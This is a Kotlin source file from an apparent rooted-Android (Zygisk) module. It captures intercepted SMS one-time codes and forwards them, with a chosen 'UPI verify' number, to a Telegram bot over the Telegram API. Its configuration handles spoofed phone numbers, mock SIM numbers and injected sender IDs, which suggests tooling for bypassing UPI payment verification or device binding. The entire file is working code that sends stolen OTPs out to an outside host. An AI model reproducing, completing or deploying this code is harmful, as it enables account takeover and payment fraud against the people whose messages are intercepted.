package com.hivirtus.zygiskmode

import android.content.Context
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class TokenForwarder(
    private val configManager: ConfigManager,
    private val context: Context? = null
) {

    private val client = OkHttpClient()

    /**
     * Sirf intercept number + SMS body — Telegram pe one-tap copy (&lt;code&gt; block).
     */
    fun forward(otp: LastOtp): Boolean {
        val config = configManager.load()
        if (!config.autoForwardToken) return false

        val peer = otp.rawPeer.ifBlank { otp.sender }
        val body = otp.body.ifBlank { otp.otp }
        if (!SmsMatcher.shouldForwardToTelegram(config, peer, body, otp.direction)) return false

        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId
        if (botToken.isBlank() || chatId.isBlank()) return false

        return postTelegram(botToken, chatId, buildInterceptMessage(otp, config))
    }

    private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
        val interceptNo = resolveUpiVerifyNumber(otp, config)
        val smsBody = otp.body.ifBlank { otp.otp }.trim()

        return buildString {
            appendLine("<code>${escapeHtml(interceptNo)}</code>")
            if (smsBody.isNotBlank()) {
                appendLine()
                append("<code>${escapeHtml(smsBody)}</code>")
            }
        }
    }

    /**
     * UPI verify number — short code / sender jahan SMS intercept hua (+91 personal nahi).
     */
    private fun resolveUpiVerifyNumber(otp: LastOtp, config: ModuleConfig): String {
        val rawPeer = otp.rawPeer.trim()
        if (rawPeer.isNotBlank() && !isSpoofOrPersonalNumber(rawPeer, config)) {
            return rawPeer
        }

        val sender = otp.sender.trim()
        val injectId = SmsMatcher.userSenderId(config)?.trim().orEmpty()
        if (sender.isNotBlank() && !isSpoofOrPersonalNumber(sender, config)) {
            if (sender != injectId || !SmsMatcher.isIndianMobileNumber(sender)) {
                return sender
            }
        }

        extractVerifyNumberFromBody(otp.body.ifBlank { otp.otp })?.let { return it }

        return rawPeer.ifBlank { sender }.ifBlank { "UPI-VERIFY" }
    }

    private fun isSpoofOrPersonalNumber(value: String, config: ModuleConfig): Boolean {
        val digits = normalizeDigits(value)
        if (digits.isBlank()) return false

        val blocked = personalNumberDigits(config).filter { it.isNotBlank() }

        return blocked.any { blockedDigits ->
            digits == blockedDigits ||
                (digits.length == 10 && blockedDigits.endsWith(digits)) ||
                (blockedDigits.length == 10 && digits.endsWith(blockedDigits))
        }
    }

    private fun personalNumberDigits(config: ModuleConfig): Set<String> = buildSet {
        add(normalizeDigits(configManager.readSpoofPhone()))
        add(normalizeDigits(config.mockPhoneSim1))
        add(normalizeDigits(config.mockPhoneSim2))
        add(normalizeDigits(config.injectSenderId))
    }

    private fun normalizeDigits(value: String): String =
        value.replace(Regex("[^0-9]"), "")

    private fun extractVerifyNumberFromBody(body: String): String? {
        if (body.isBlank()) return null
        Regex("""(?<!\d)(91\d{10}|\d{10}|\d{6,12})(?!\d)""").findAll(body).forEach { match ->
            val candidate = match.groupValues[1]
            val config = configManager.load()
            if (!isSpoofOrPersonalNumber(candidate, config)) return candidate
        }
        return null
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private fun postTelegram(botToken: String, chatId: String, text: String): Boolean {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = JSONObject()
            .put("chat_id", chatId)
            .put("text", text)
            .put("parse_mode", "HTML")
            .put("disable_web_page_preview", true)
            .toString()
        return postJson(url, payload)
    }

    private fun postJson(url: String, payload: String): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }
}
